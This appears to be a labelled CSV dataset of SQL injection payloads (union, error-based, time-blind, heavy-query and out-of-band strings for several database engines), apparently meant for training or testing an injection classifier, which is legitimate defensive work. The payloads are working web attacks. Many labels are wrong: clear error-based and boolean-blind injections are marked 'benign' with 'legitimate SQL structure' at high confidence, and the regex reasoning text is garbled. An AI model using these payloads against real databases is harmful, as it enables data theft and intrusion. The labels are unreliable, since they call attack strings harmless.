id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25874,"1' ) where 3331 = 3331 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25875,"1"" where 4066 = 4066 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",error_based,generic,0.85,Signal match: updatexml → error_based (P4); confidence: 0.85,1
25876,"-3609"" ) ) as fzyp where 9474 = 9474 or 9323 = 9323#",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25877,"-6335"" ) ) ) union all select 3654--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25878,"1' ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25879,"1"" ) as fgne where 7207 = 7207",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25880,"1"" and 4288 = 3696 and ""qqam"" like ""qqam",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25881,"1' or elt ( 6272 = 6272,sleep ( 5 ) ) and 'wdoi' = 'wdoi",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25882,"1"" or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25883,1' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'ykjs' like 'ykjs,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25884,-9875' ) or ( 8459 = 8459 ) *4906 and ( 'mrxw' = 'mrxw,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25885,"1"" ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( ""gfwz"" = ""gfwz",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25886,"1"" ) where 2473 = 2473 and make_set ( 6118 = 7684,7684 ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25887,"-2787' ) ) union all select 1996,1996,1996,1996,1996,1996,1996,1996#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25888,"-5928"" ) ) or elt ( 1032 = 1032,3623 ) and ( ( ""rggt"" like ""rggt",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25889,"1 ) where 7588 = 7588 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25890,"1 ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25891,-7773' or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ),benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25892,"1"" where 2878 = 2878 union all select null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25893,-3597' ) ) order by 1--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25894,1 ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25895,"1"" ) as qirf where 6200 = 6200 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25896,"1%"" or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25897,1' ) ) ) rlike ( select ( case when ( 5855 = 7142 ) then 1 else 0x28 end ) ) and ( ( ( 'fkhd' = 'fkhd,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25898,"1"" ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ""nkgd"" = ""nkgd",error_based,generic,0.85,Signal match: updatexml → error_based (P4); confidence: 0.85,1
25899,"1' in boolean mode ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25900,"1'|| ( select 'wtdz' from dual where 1866 = 1866 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,oracle,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25901,"1%"" and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25902,"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and 'ozur' = 'ozur",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25903,select ( case when ( 7254 = 5901 ) then 1 else 7254* ( select 7254 from master..sysdatabases ) end ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25904,"-4550"" ) as hlwe where 6026 = 6026 or ( 9364 = 9593 ) *9593--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25905,"-9408%"" ) ) union all select 1841,1841,1841,1841,1841,1841--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25906,"1%"" ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25907,"1"" where 5927 = 5927",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25908,-1629' ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'tezf' = 'tezf,out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
25909,"1%' ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( '%' = '",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25910,"1' ) ) and elt ( 4249 = 4249,7259 ) and ( ( 'oucg' = 'oucg",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25911,"-8046"" ) ) ) union all select 3126,3126,3126,3126,3126,3126,3126,3126,3126#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25912,"1%"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ""%"" = """,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25913,1' ) ) as yyrx where 5600 = 5600,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25914,"-7725%' ) ) union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25915,"1 ) ) as cdhd where 2958 = 2958 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25916,"1%' ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25917,1' ) ) rlike ( select ( case when ( 6205 = 1384 ) then 1 else 0x28 end ) ) and ( ( 'ahjf' = 'ahjf,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25918,-1638' or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'xkne' = 'xkne,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25919,( case when 5640 = 5640 then 5640 else null end ),unknown,generic,0.50,Insufficient information to classify,1
25920,"-1503"" order by 1--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25921,"1"" ) and 2006 = 2006",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25922,1' ) ) ) and 2542 = 7042--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25923,"1' ) where 6746 = 6746 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25924,"-7433"" ) ) as zsnt where 2513 = 2513 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
25925,"-4373%"" ) ) or 5672 = 5188--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25926,"1' ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( 'dssx' like 'dssx",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25927,1' rlike sleep ( 5 ) and 'ojqz' like 'ojqz,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25928,1' ) as xskm where 3525 = 3525 and 2435 = 6513,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25929,"1%"" ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25930,1' ) ) as joco where 2922 = 2922,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25931,"1%"" ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25932,1' ) ) as dipp where 1714 = 1714,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25933,end and ( 'unko' = 'unko,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25934,"1"" ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25935,-5116 ) or ( 8287 = 4930 ) *4930,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25936,select sleep ( 5 ) # wihl,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25937,"1%' ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( '%' = '",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25938,1' ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'rjjo' = 'rjjo,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25939,1'|| ( select 'bgdh' from dual where 1967 = 1967,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25940,"1'+ ( select 'dbvq' where 2045 = 2045 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25941,"-6798%"" ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25942,"1' ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'sqbr' = 'sqbr",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25943,1'|| ( select 'dfmw' from dual where 1723 = 1723,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
